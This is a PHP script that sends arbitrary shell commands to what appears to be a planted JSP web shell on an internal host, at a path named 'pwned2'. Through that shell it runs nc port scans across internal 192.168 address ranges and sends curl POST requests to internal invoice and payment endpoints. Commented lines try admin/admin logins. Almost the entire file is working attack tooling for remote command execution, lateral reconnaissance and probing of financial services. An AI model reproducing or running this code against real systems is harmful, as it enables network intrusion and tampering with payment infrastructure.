<?php
require 'vendor/autoload.php';

include './includes/core_auto.php';
include './includes/conn_auto.php';
include './includes/conn_pure.php';

function universal_dab($command, $head)
{
    $cmd = urlencode($command);
    $url = 'http://192.168.2.142:8080/pwned2/index2.jsp?cmd=' . $cmd;
    $data = httpGet($url, []);
    $data = '<h2>' . $head . '</h2>' . $data . '<br/><br/><br/><br/>';
    return $data;
}
function port_scanner($port, $ip,  $obj, $max = 2000)
{
    if ($port < $max) {
        $a = $port;
        $b = 0;
        $c = 500;
        $ab = $a + $b;
        $ac = $a + $c;
        $rng = $ab . '-' . $ac;
        $cmd = "nc -zv " . $ip . " " . $rng;
        $dt = universal_dab($cmd, 'head');
        $port = $port + 500;
        $obj .= $dt;
        echo $dt;
        port_scanner($port, $ip,  $obj, $max);
    } else {
        return $obj;
    }
}

function port_finder($ip, $ab, $ac)
{
    $rng = $ab . '-' . $ac;
    $cmd = "nc -zv " . $ip . " " . $rng;
    $dt = universal_dab($cmd, 'head');
    return $dt;
}
function port_func()
{
    for ($a = 0; $a <= 1; $a++) {
        for ($b = 0; $b <= 5; $b++) {
            $ip = "192.168." . $a . "." . $b;
            $ddd = port_finder($ip, 3300, 3310);
            echo $ddd;
            // file_put_contents('store_5/port.html', $ddd, FILE_APPEND);
        }
    }
    return 'done';
}

$a = 19500;

$b = 0;
$c = 500;
$ab = $a + $b;
$ac = $a + $c;

$rng = $ab . '-' . $ac;
//$cmd = "curl  -X POST 192.168.102.20:8003/taifa/nrs/confirm";
//$data = '{"invoice_no":"BL-UBP-164232","bankdetails":null}';
$data = '"invoice_no=BL-UBP-164232&bankdetails="';
//$cmd = "curl -X POST 192.168.102.20:8003/taifa/nrs/consolidate  -H 'Content-Type: application/json' -d '".$data."'";
//$cmd = "curl  -X POST 192.168.102.20:8003/taifa/nrs/confirm";
//$cmd = "curl -X POST 192.168.102.20:8003/taifa/nrs/validate -d 'referense=BL-UBP-164232'";
//$cmd = "nc -zv 192.168.100.151 ".$rng;

//$cmd = "curl -v -X POST http://192.168.100.116/gateway/taifa/nrs/validate -H 'Content-Type: application/json' -d '".$data."'";
$cmd = "curl -v -X POST -H 'Content-Type: application/json' -d '".$data."' http://192.168.100.116/gateway/taifa/nrs/validate";
//$cmd = 'curl -v -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-raw '."'".$data."'".' http://192.168.100.116/gateway/taifa/nrs/consolidate';
//$cmd = 'curl -X POST -H "Content-Type: application/json" --json {"username":"admin","password":"admin"}'  http://localhost:5050/login';
//$cmd = 'curl -v -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-raw '.$data.' http://192.168.100.116/gateway/taifa/nrs/consolidate';
//$cmd = 'curl -v -X POST -H "Content-Type: application/json" -d "{ \"invoice_no\": \"value1\" }" http://192.168.100.116/gateway/taifa/nrs/consolidate';

echo $cmd;

echo universal_dab($cmd, 'head');
//echo port_scanner(1, "192.168.100.116", "", 66000);
//echo port_func();
//echo port_finder("192.168.100.151",'3000','3500');